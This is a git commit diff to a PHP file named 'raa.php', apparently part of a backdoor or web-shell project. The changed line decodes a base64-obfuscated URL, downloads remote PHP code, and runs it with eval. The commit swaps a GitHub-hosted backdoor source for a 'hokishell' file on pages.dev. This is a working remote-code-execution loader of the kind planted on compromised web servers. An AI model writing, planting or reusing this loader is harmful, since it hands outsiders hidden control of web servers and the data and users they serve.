6c35d8e688f0d81fc70ef05e11af556b48e5c8ee
Setsuna Watanabe <105861519+Yucaerin@users.noreply.github.com>
2024-08-05 01:04:42 +0700

    Update raa.php

--- raa.php
+++ raa.php
@@ -34,5 +34,5 @@
     return $data;
 }
 $x= '?>';
-      eval($x . get(base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1l1Y2FlcmluL3NpbXBsZWNtZGFuZGJhY2tkb29yL21haW4vcmEucGhw')));
+      eval($x . get(base64_decode('aHR0cHM6Ly9ob2tpc2hlbGwucGFnZXMuZGV2L2hva2kudHh0')));
 ?>
